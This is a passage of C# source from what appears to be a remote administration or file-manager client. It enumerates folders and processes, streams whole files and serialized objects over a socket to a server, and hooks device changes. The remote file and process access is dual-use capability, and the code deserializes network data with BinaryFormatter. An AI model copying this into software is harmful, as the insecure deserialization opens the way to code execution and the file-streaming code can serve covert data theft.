                            node.Text = dirList[i].Substring(dirList[i].LastIndexOf(@"\") + 1);
                            node.ImageKey = "Folder";
                            node.SelectedImageKey = "Folder";
                            parentNode.Nodes.Add(node);
                        }

                        return true;
                    }
                    else
                        return false;
                }
                else return false;
            }
            catch (Exception e)
            {
                LogError(e.Message);
                return false;
            }
        }

        private bool GetFilesAndDir(TreeNode Node)
        {
            try
            {
                return GetSubDirectories(Node);
            }
            catch (Exception e)
            {
                LogError(e.Message);
                return false;
            }
        }


        public static void SendMessage(object msg)
        {
            ThreadPool.QueueUserWorkItem(new WaitCallback(SendNow), msg);
        }

        private static void SendNow(object msg)
        {
            int seek = 0;
            const int count = 102400;

            try
            {
                Socket handler = server.Client;

                ByteArrayBuilder b = new ByteArrayBuilder();
                b.Append(ObjectToByteArray(msg));

                byte[] ol = BitConverter.GetBytes(b.Length);

                handler.BeginSend(ol, 0, ol.Length, 0, new AsyncCallback(SendCallBack), handler);

                //count = b.Length;
                int length = b.Length;

                while (length > count)
                {
                    handler.BeginSend(b.ToArray(seek, count), 0, count, 0, new AsyncCallback(SendCallBack), handler);
                    //handler.BeginSend(buffer, 0, count, 0, new AsyncCallback(SendCallBack), handler);
                    seek += count;
                    length = length - count;
                }

                handler.BeginSend(b.ToArray(seek, length), 0, length, 0, new AsyncCallback(SendCallBack), handler);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private void SendFile(string path)
        {
            byte[] buffer = new byte[102400];
            Socket handler = server.Client;
            int readbytes = 0;
            try
            {
                using (FileStream stream = new FileStream(path, FileMode.Open))
                {
                    do
                    {
                        stream.Flush();
                        readbytes = stream.Read(buffer, 0, buffer.Length);

                      //  clientSock.Send(clientData, readbytes, SocketFlags.None);
                        handler.BeginSend(buffer, 0, readbytes, 0, new AsyncCallback(SendCallBack), handler);
                        
                    } while (readbytes > 0);
                    stream.Close();
                }
            }
            catch (Exception ex)
            {
                LogError(ex.ToString());
            }
        }

        private static void SendCallBack(IAsyncResult ar)
        {
            try
            {
                Socket handler = (Socket) ar.AsyncState;
                int bytesSend = handler.EndSend(ar);
            }
            catch(Exception e) 
            {
                Debug.WriteLine(e.Message, "Error");
            }
        }

        private object LoadAllProcesses()
        {
            IList<string[]> po = new List<string[]>();
            Process[] processes = null;
            try
            {
                processes = Process.GetProcesses();
            }
            catch (Exception ex)
            {
                LogError(ex.ToString());
            }

            foreach (Process p in processes)
            {
                try
                {
                    string[] prcdetails = new string[]
                    {
                        p.ProcessName, p.Id.ToString(), p.StartTime.ToShortTimeString(),
                        p.TotalProcessorTime.Duration().Hours.ToString() + ":" +
                        p.TotalProcessorTime.Duration().Minutes.ToString() + ":" +
                        p.TotalProcessorTime.Duration().Seconds.ToString(),
                        (p.WorkingSet/1024).ToString() + "k",
                        (p.PeakWorkingSet/1024).ToString() + "k", p.HandleCount.ToString(), p.Threads.Count.ToString()
                    };

                    po.Add(prcdetails);
                }
                catch (Exception ex1)
                {
                    LogError(ex1.Message);
                }
            }
            return po;

        }

        private static byte[] ObjectToByteArray(Object obj)
        {
            try
            {
                if (obj == null)
                    return null;
                BinaryFormatter bf = new BinaryFormatter();
                bf.AssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Simple;
                MemoryStream ms = new MemoryStream();
                bf.Serialize(ms, obj);
                return ms.ToArray();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, "Critical Error");
                return null;
            }
        }

        private void SendStatistics()
        {
            List<PerformanceCounter> counters = new List<PerformanceCounter>();
            counters.Add(new PerformanceCounter("Process", "IO Data Bytes/sec", Process.GetCurrentProcess().ProcessName));
            counters.Add(new PerformanceCounter("Process", "% Processor Time", Process.GetCurrentProcess().ProcessName));
            List<String> data=new List<string>();

            foreach (PerformanceCounter pc in counters)
            {
                data.Add(pc.NextValue().ToString());
            }
        }

        private Object ByteArrayToObject(byte[] arrBytes)
        {
            try
            {
                MemoryStream memStream = new MemoryStream();
                BinaryFormatter binForm = new BinaryFormatter();
                binForm.AssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Simple;
                binForm.Binder = new DeserializationBinder();
                memStream.Write(arrBytes, 0, arrBytes.Length);
                memStream.Seek(0, SeekOrigin.Begin);
                Object obj = (Object) binForm.Deserialize(memStream);
                return obj;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        private void DeviceChangeHook(object obj)
        {
            bool dev = bool.Parse(obj.ToString());
            if(dev)
            {
                if (notifier == null)
                    notifier = new Core.DeviceNotification();

                notifier.Hook();
            }
            else
            {
                notifier.Unhook();
            }
        }
    }

    public class StateObject
    {
        public Socket workSocket = null;
        public const int BufferSize = 102400;
        public byte[] buffer = new byte[BufferSize];
        public StringBuilder sb = new StringBuilder();
        public ByteArrayBuilder bab = new ByteArrayBuilder();
        public int ol;
        public FileInfo fileInfo;
        public long fileSizeReceived;
    }

    #region Struct,Class

    public class Win32
    {
        public const uint SHGFI_ICON = 0x100;
        //public const uint SHGFI_LARGEICON = 0x0;    // 'Large icon
        public const uint SHGFI_SMALLICON = 0x1; // 'Small icon

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(
            string pszPath,
            uint dwFileAttributes,
            ref SHFILEINFO psfi,
            uint cbSizeFileInfo,
            uint uFlags);

        [DllImport("kernel32")]
        public static extern uint GetDriveType(
            string lpRootPathName);

        [DllImport("shell32.dll")]
        public static extern bool SHGetDiskFreeSpaceEx(
            string pszVolume,
            ref ulong pqwFreeCaller,
            ref ulong pqwTot,
            ref ulong pqwFree);

        [DllImport("shell32.Dll")]
        public static extern int SHQueryRecycleBin(
            string pszRootPath,
            ref SHQUERYRBINFO pSHQueryRBInfo);

        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public IntPtr iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)] public string szTypeName;
        };

        [StructLayout(LayoutKind.Sequential)]
        public class BITMAPINFO
        {
            public Int32 biSize;
            public Int32 biWidth;
            public Int32 biHeight;
            public Int16 biPlanes;
            public Int16 biBitCount;
            public Int32 biCompression;
            public Int32 biSizeImage;
            public Int32 biXPelsPerMeter;
            public Int32 biYPelsPerMeter;
            public Int32 biClrUsed;
            public Int32 biClrImportant;
            public Int32 colors;
        };

        [DllImport("comctl32.dll")]
        public static extern bool ImageList_Add(IntPtr hImageList, IntPtr hBitmap, IntPtr hMask);

        [DllImport("kernel32.dll")]
        private static extern bool RtlMoveMemory(IntPtr dest, IntPtr source, int dwcount);

        [DllImport("shell32.dll")]
        public static extern IntPtr DestroyIcon(IntPtr hIcon);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateDIBSection(IntPtr hdc, [In, MarshalAs(UnmanagedType.LPStruct)] BITMAPINFO pbmi,
            uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);


    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct SHQUERYRBINFO
    {
        public uint cbSize;
        public ulong i64Size;
        public ulong i64NumItems;
    };

    #endregion
}